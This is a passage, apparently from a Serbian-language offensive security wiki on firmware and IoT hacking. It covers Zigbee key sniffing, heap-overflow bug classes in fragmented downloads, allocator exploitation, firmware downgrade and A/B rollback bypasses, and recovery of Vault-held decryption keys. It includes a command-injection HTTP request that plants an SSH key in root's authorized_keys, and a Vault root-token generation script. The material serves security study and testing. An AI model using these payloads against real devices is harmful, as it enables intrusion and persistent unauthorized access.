2. **parser na strani kontrolera** na radio MCU-u
3. **serijski/UART tekstualni ili TLV protokol** prosleđen Linuxu (na primer `/dev/tty*`)
4. **dispečer aplikacije** u glavnom demonu
5. **rukovalac specifičan za protokol / mašina stanja**

Ova arhitektura stvara dve mete za reverzno inženjerstvo, umesto jedne. Ako kontroler pretvara binarne radio-okvire u tekstualni protokol kao što je `Group,Command,arg1,arg2,...`, utvrdite:

- **Grupe poruka** i tabele dispečera
- Koje poruke mogu poticati iz **mreže**, a koje od samog kontrolera
- Tačna **polja diskriminatora specifična za proizvođača** (na primer Zigbee `manufacturer_code` i prilagođeni `cluster_command`)
- Koji rukovaoci su dostupni samo tokom faza **uparivanja**, otkrivanja ili preuzimanja firmvera/modela

Za Zigbee konkretno, snimite saobraćaj tokom uparivanja i proverite da li se meta i dalje oslanja na podrazumevani **Link Key** `ZigBeeAlliance09`. Ako se oslanja, prisluškivanje saobraćaja tokom uparivanja može otkriti **Network Key**. Zigbee 3.0 install codes smanjuju ovu izloženost, pa zabeležite da li ih testirani uređaj zaista obavezno zahteva.

### Rukovaoci protokolom specifični za proizvođača i dostupnost uslovljena FSM-om

Zigbee/ZCL komande specifične za proizvođača često su bolja meta od standardizovanih klastera, jer ulaze u **prilagođeni kod za parsiranje** i interne **FSM-ove** sa manje proverama nego što su prošli kroz intenzivno testiranje.<sup>[[8]](#references)</sup>

Praktičan postupak:

- Obrnutim inženjerstvom pratite dispečer komandi dok ne pronađete **rukovalac dostupan samo proizvođaču**.
- Rekonstruišite tabele **stanja FSM-a**, **događaja**, **provera**, **akcija** i **sledećih stanja**.
- Identifikujte **prelazna stanja** koja automatski napreduju, kao i grane za ponovni pokušaj/grešku koje na kraju resetuju ili oslobađaju stanje pod kontrolom napadača.
- Potvrdite koje su legitimne razmene protokola potrebne da bi se demon doveo u ranjivo stanje, umesto da pretpostavite da je ranjivi rukovalac uvek dostupan.

Kod protokola osetljivih na tajming, ponovno slanje paketa iz Python okruženja može biti presporo. Pouzdaniji pristup je emulacija legitimnog uređaja na stvarnom hardveru (na primer **nRF52840**) sa stekom namenjenim proizvođačima, kako biste mogli da izložite odgovarajuće **krajnje tačke**, **atribute** i tajming uparivanja.

### Klasa grešaka u fragmentiranim preuzimanjima u ugrađenim demonima

Ponavljajuća klasa grešaka u firmveru javlja se pri **fragmentiranim preuzimanjima blobova/modela/konfiguracija**:<sup>[[8]](#references)</sup>

1. **Prvi fragment** (`offset == 0`) upisuje `ctx->total_size` i alocira `malloc(total_size)`.
2. Naredni fragmenti proveravaju samo polja pod kontrolom napadača koja važe za **pojedinačni paket**, kao što je `packet_total_size >= offset + chunk_len`.
3. Kopiranje koristi `memcpy(&ctx->buffer[offset], chunk, chunk_len)` bez provere da li je veličina unutar **prvobitno alociranog prostora**.

Napadač tako može da pošalje:

- Prvi ispravan fragment sa **malom** deklarisanom ukupnom veličinom kako bi iznudio malu alokaciju na hipu.
- Kasniji fragment sa **očekivanim pomakom**, ali većim `chunk_len`.
- Falsifikovanu veličinu paketa koja prolazi nove provere, ali i dalje izaziva prepisivanje prvobitno alociranog bafera.

Kada se ranjiva putanja nalazi iza logike uparivanja, eksploatacija mora da uključi dovoljno **emulacije uređaja** da bi se meta dovela u očekivano stanje za preuzimanje modela ili bloba pre slanja neispravnih fragmenata.

### Okidači za `free()` zasnovani na protokolu

U ugrađenim demonima, najlakši način da se izazove eksploatacija metapodataka hipa često nije „čekanje na čišćenje“, već **aktiviranje sopstvene obrade grešaka protokola**:<sup>[[8]](#references)</sup>

- Pošaljite neispravne naknadne fragmente da biste prebacili FSM u stanja **ponovnog pokušaja** ili **greške**.
- Premašite prag za ponovne pokušaje da bi demon **resetovao kontekst** i oslobodio oštećeni bafer.
- Iskoristite ovaj predvidljivi `free()` da biste aktivirali primitive alokatora pre nego što se proces sruši iz nekog drugog razloga.

Ovo je naročito korisno protiv alokatora nalik na **musl/uClibc/dlmalloc** u ugrađenom Linuxu, gde oštećivanje metapodataka blokova može logiku unlink/unbin da pretvori u primitivu za upis. Stabilan obrazac je oštećivanje **polja veličine** kako bi se obilazak alokatora preusmerio na **lažne blokove postavljene unutar prepisanog bafera**, umesto da se odmah prepišu stvarni pokazivači binova i sruši proces.

## Eksploatacija binarnih datoteka i dokaz koncepta

Razvoj PoC-a za identifikovane ranjivosti zahteva temeljno razumevanje arhitekture mete i programiranje u nižim jezicima. Zaštite izvršavanja binarnih datoteka u ugrađenim sistemima su retke, ali kada postoje, mogu biti potrebne tehnike kao što je Return Oriented Programming (ROP).

### Napomene o iskorišćavanju uClibc fastbin-a (ugrađeni Linux)

- **Fastbins + konsolidacija:** uClibc koristi fastbins slične onima u glibc-u. Naknadna velika alokacija može pokrenuti `__malloc_consolidate()`, pa svaki lažni blok mora da prođe provere (ispravna veličina, `fd = 0` i okolni blokovi prepoznati kao „zauzeti“).<sup>[[6]](#references)</sup>
- **Binarne datoteke koje nisu PIE pod ASLR-om:** ako je ASLR omogućen, ali glavna binarna datoteka **nije PIE**, adrese u okviru same binarne datoteke, u `.data/.bss`, ostaju stabilne. Možete ciljati oblast koja već liči na ispravno zaglavlje bloka na hipu kako biste alokacijom fastbin-a dospeli do **tabele pokazivača na funkcije**.
- **NUL koji zaustavlja parser:** pri parsiranju JSON-a, `\x00` u sadržaju može da zaustavi parsiranje, a da se pritom zadrže naknadni bajtovi pod kontrolom napadača za pivot steka/ROP lanac.
- **Shellcode preko `/proc/self/mem`:** ROP lanac koji poziva `open("/proc/self/mem")`, `lseek()` i `write()` može da smesti izvršivi shellcode na poznato mapiranje i skoči na njega.

## Pripremljeni operativni sistemi za analizu firmvera

Operativni sistemi kao što su [AttifyOS](https://github.com/adi0x90/attifyos) i [EmbedOS](https://github.com/scriptingxss/EmbedOS) pružaju unapred konfigurisana okruženja za testiranje bezbednosti firmvera, opremljena neophodnim alatima.

## Pripremljeni OS-ovi za analizu firmvera

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS je distribucija namenjena proceni bezbednosti i testiranju penetracije Internet of Things (IoT) uređaja. Štedi vam mnogo vremena tako što pruža unapred konfigurisano okruženje sa svim potrebnim alatima.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Operativni sistem za testiranje bezbednosti ugrađenih sistema, zasnovan na Ubuntu 18.04 i unapred opremljen alatima za testiranje bezbednosti firmvera.

## Napadi vraćanjem na stariju verziju firmvera i nebezbedni mehanizmi ažuriranja

Čak i kada proizvođač implementira proveru kriptografskog potpisa za slike firmvera, **zaštita od vraćanja na stariju verziju (downgrade) često izostaje**. Ako boot ili recovery loader proverava samo potpis pomoću ugrađenog javnog ključa, ali ne upoređuje *verziju* slike koja se upisuje (niti monotoni brojač), napadač može legitimno da instalira **stariji, ranjivi firmver sa i dalje važećim potpisom**, čime se ponovo uvode zakrpljene ranjivosti.<sup>[[4]](#references)</sup>

Uobičajen tok napada:

1. **Nabavite stariju potpisanu sliku**
   * Preuzmite je sa javnog portala za preuzimanje, CDN-a ili stranice za podršku proizvođača.
   * Izdvojite je iz pratećih mobilnih/desktop aplikacija (npr. iz direktorijuma `assets/firmware/` u Android APK-u).
   * Pronađite je u repozitorijumima trećih strana kao što su VirusTotal, Internet arhive, forumi itd.
2. **Otpremite sliku na uređaj ili je poslužite uređaju** preko bilo kog dostupnog kanala za ažuriranje:
   * Veb interfejs, API mobilne aplikacije, USB, TFTP, MQTT itd.
   * Mnogi potrošački IoT uređaji izlažu *neautentifikovane* HTTP(S) krajnje tačke koje prihvataju Base64-kodirane blobove firmvera, dekodiraju ih na strani servera i pokreću oporavak/nadogradnju.
3. Nakon vraćanja na stariju verziju, iskoristite ranjivost koja je zakrpljena u novijem izdanju (na primer filter za command injection koji je naknadno dodat).
4. Po želji, ponovo instalirajte najnoviju sliku ili onemogućite ažuriranja kako biste izbegli otkrivanje nakon uspostavljanja perzistencije.

### Primer: Command Injection nakon vraćanja na stariju verziju

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

U ranjivom firmware-u (sa sniženom verzijom), parametar `md5` se direktno konkatenira u shell komandu bez sanitizacije, što omogućava ubacivanje proizvoljnih komandi (ovde — omogućavanje root pristupa zasnovanog na SSH ključu). Kasnije verzije firmware-a uvele su osnovni filter znakova, ali zbog odsustva zaštite od vraćanja na stariju verziju ta ispravka nema efekta.<sup>[[4]](#references)</sup>

### Izdvajanje firmware-a iz mobilnih aplikacija

Mnogi proizvođači uključuju kompletne slike firmware-a u prateće mobilne aplikacije kako bi aplikacija mogla da ažurira uređaj putem Bluetooth/Wi-Fi veze. Ovi paketi se obično čuvaju nešifrovani u APK/APEX datotekama, na putanjama kao što su `assets/fw/` ili `res/raw/`. Alatke kao što su `apktool`, `ghidra` ili čak običan `unzip` omogućavaju izdvajanje potpisanih slika bez pristupa fizičkom hardveru.<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### Zaobilaženje anti-rollback zaštite samo u updater-u kod A/B slot dizajna

Neki vendori implementiraju **ratchet** protiv downgrade-a, ali samo u logici *updater*-a (na primer, UDS rutina preko CAN-a, recovery komanda ili OTA agent u userspace-u). Ako **bootloader** kasnije proverava samo potpis/CRC image-a i veruje tabeli particija ili metapodacima slot-a, zaštita od rollback-a i dalje može da se zaobiđe.<sup>[[7]](#references)</sup>

Tipičan slab dizajn:

- Metapodaci firmware-a sadrže i deskriptor verzije i **security ratchet** / monotoni brojač.
- Updater poredi ratchet image-a sa vrednošću sačuvanom u persistent storage-u i odbacuje starije potpisane image-e.
- Bootloader **ne** parsira taj ratchet i proverava samo zaglavlje, CRC i potpis pre pokretanja izabranog slot-a.
- Aktivacija slot-a čuva se zasebno u tabeli particija ili brojaču generacije po slot-u i nije kriptografski vezana za tačan firmware digest koji je validiran.

Ovo omogućava primitivu **validate-one-image / boot-another-image** u dual-slot sistemima. Ako napadač može da navede updater da označi slot B kao sledeći slot za pokretanje koristeći aktuelni potpisani image, a zatim da pre restarta prepiše slot B, bootloader i dalje može da pokrene downgrade-ovani image jer veruje samo već potvrđenim metapodacima slot-a.

Uobičajeni obrazac zloupotrebe:

1. Otpremite **aktuelni potpisani** firmware u pasivni slot i pokrenite uobičajenu rutinu za validaciju/prebacivanje, tako da raspored označi taj slot kao sledeći aktivni slot.
2. **Nemojте još da restartujete.** Ponovo pokрените rutinu za pripremu/brisanje slot-a u istoj sesiji.
3. Zloupotrebite zastarelo boot stanje ili zastarelu logiku izbora slot-a kako bi updater obrisao **isti fizički slot** koji je upravo promovisan.
4. Zapišite **stariji, ali i dalje potpisani** firmware u taj slot.
5. Preskočite rutinu za validaciju koja sprovodi ratchet i restartujte direktno.
6. Bootloader bira promovisani slot, proverava samo potpis/integritet i pokreće stari image.

Šta treba tražiti prilikom reverzije A/B update implementacija:

- Izbor slot-a zasnovan na **boot-time zastavicama** koje sa uspešnim prebacivanjem nisu osvežene.
- Rutina nalik na `prepare_passive_slot()`, koja briše slot na osnovu zastarelog stanja umesto **trenutnog potvrđenog rasporeda**.
- Funkcija nalik na `part_write_layout()`, koja samo povećava **generation counter** / aktivnu zastavicu, a ne čuva hash validiranog image-a.
- Ratchet provere implementirane u userspace-у ili updater kodu, ali **ne** u ROM / bootloader / secure boot fazama.
- Rutine za brisanje ili oporavak koje ostavljaju slot označen kao pokretljiv čak i nakon što je njegov sadržaj obrisan i ponovo zapisan.

### Kontrolna lista za procenu update logike

* Da li je transport/autentikacija *update endpoint*-a adekvatno zaštićena (TLS + autentikacija)?
* Da li uređaj poredi **brojeve verzija** ili **monotoni anti-rollback brojač** pre flash-ovanja?
* Da li se image proverava unutar secure boot lanca (npr. da li ROM kod proverava potpise)?
* Da li **bootloader sprovodi isti ratchet** kao updater, umesto da proverava samo potpis/CRC?
* Da li su metapodaci za aktivaciju slot-a **vezani za digest/verziju validiranog firmware-a**, ili se slot može izmeniti nakon promocije?
* Nakon uspešnog prebacivanja slot-a, da li je uređaj primoran da se restartuje ili su kasnije update/erase rutine i dalje dostupne u istoj sesiji?
* Da li userland kod sprovodi dodatne provere ispravnosti (npr. dozvoljenu mapu particija, broj modela)?
* Da li *partial* ili *backup* update tokovi ponovo koriste istu logiku za validaciju?

> 💡  Ako nešto od navedenog nedostaje, platforma je verovatno ranjiva na rollback napade.

## Ranjivi firmware za vežbu

Da biste vežbali otkrivanje ranjivosti u firmware-u, za početak koristite sledeće ranjive firmware projekte.

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Oporavak ključeva za dešifrovanje firmware-a iz ugrađenog KMS/Vault stanja

Kada update image kombinuje male metapodatke u otvorenom tekstu sa velikim blob-om visoke entropije, pre bilo kakvog brute-force napada analizirajte kontejner:<sup>[[1]](#references)</sup>

- Izdvojite zaglavlja, pomeraje i granice redova pomoću `hexdump`, `xxd`, `strings -tx`, `base64 -d` i `binwalk -E`.
- `Salted__` obično označava OpenSSL `enc` format: sledećih 8 bajtova predstavljaju salt, a preostali bajtovi su ciphertext.
- Base64 polje koje se dekodira tačno u `256` bajtova snažno ukazuje na to da je reč o RSA-2048 ciphertext-u koji omotava nasumičnu firmware lozinku/session key.
- Odvojeni PGP materijal u istoj datoteci često štiti samo autentičnost; nemojte pretpostavljati da se njime obezbeđuje poverljivost.

Ako potraga za statičkim ključevima (`grep`, `strings`, PEM/PGP pretrage) ne uspe, reverzujte **operativni put dešifrovanja** umesto da samo tražite privatne ključeve:

- Dekompajlirajte updater / management binary i pratite ko čita šifrovani blob, koja pomoćna funkcija/API ga dešifruje i koji logički naziv ključa se traži.
- Pretražite izdvojeni root filesystem u potrazi za KMS stanjem (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), kao i unit datotekama i init skriptama.
- Tretirajte tekst u otvorenom obliku `vault operator unseal ...`, recovery ključeve, bootstrap tokene ili lokalne KMS auto-unseal skripte kao ekvivalent materijalu privatnog ključa.

Ako appliance sadrži originalni Vault binary i storage backend, obično je lakše ponovo pokrenuti to okruženje nego ponovo implementirati interne delove Vault-a:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

Sa root pristupom na kloniranom KMS-u:

- Učinite transit ključeve izvozivim samo unutar izolovanog klona: `vault write transit/keys/<name>/config exportable=true`
- Izvezite unwrap ključ: `vault read transit/export/encryption-key/<name>`
- Isprobajte oporavljeni RSA ključ koristeći tačan par padding/hash koji koristi KMS. Neuspešna PKCS#1 v1.5 dekripcija i neuspešna podrazumevana OAEP dekripcija **ne** dokazuju da je ključ pogrešan; mnogi tokovi zasnovani na Vault-u koriste OAEP sa SHA-256, dok su uobičajene biblioteke podrazumevano podešene na SHA-1.
- Ako payload počinje sa `Salted__`, tačno reprodukujte KDF koji koristi proizvođač u OpenSSL-u (`EVP_BytesToKey`, često MD5 na starijim uređajima) pre pokušaja AES-CBC dekripcije.

Tako problem „šifrovanog firmware-a” postaje opštiji: **oporavite operativne ključeve na strani uređaja, a zatim van mreže reprodukujte tačne parametre unwrap + KDF**.

## Obuke i sertifikati

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Razbijanje Firmware-a uz Claude: veštine seniorskog nivoa, autonomija juniorskog nivoa](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Metodologija testiranja bezbednosti Firmware-a](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Praktični IoT Hacking: konačni vodič za napad na Internet stvari](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [Exploiting zero days u napuštenom hardveru – blog Trail of Bits](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [Kako mi je pametni uređaj od 20 $ omogućio pristup vašem domu](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [Sada me vidiš: sad si Pwned](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Exploiting Tesla Wall Connector-a preko konektora priključka za punjenje - 2. deo: zaobilaženje zaštite od vraćanja na stariju verziju](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [Neka zatreperi: Over-the-Air Exploitation Philips Hue Bridge-a](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [ROOT Tesla OS na QEMU, 1. deo: raspakivanje](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Dokumentacija Linux kernela - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [ROOT Tesla OS na QEMU, 2. deo: otklanjanje grešaka i ispravljanje](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS lozinke: slaba XOR enkripcija omogućava oporavak iz SPI fleša (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - alati za oporavak Dell BIOS lozinki](https://github.com/R3n5k1/dellpwn)
{{#include ../../banners/hacktricks-training.md}}
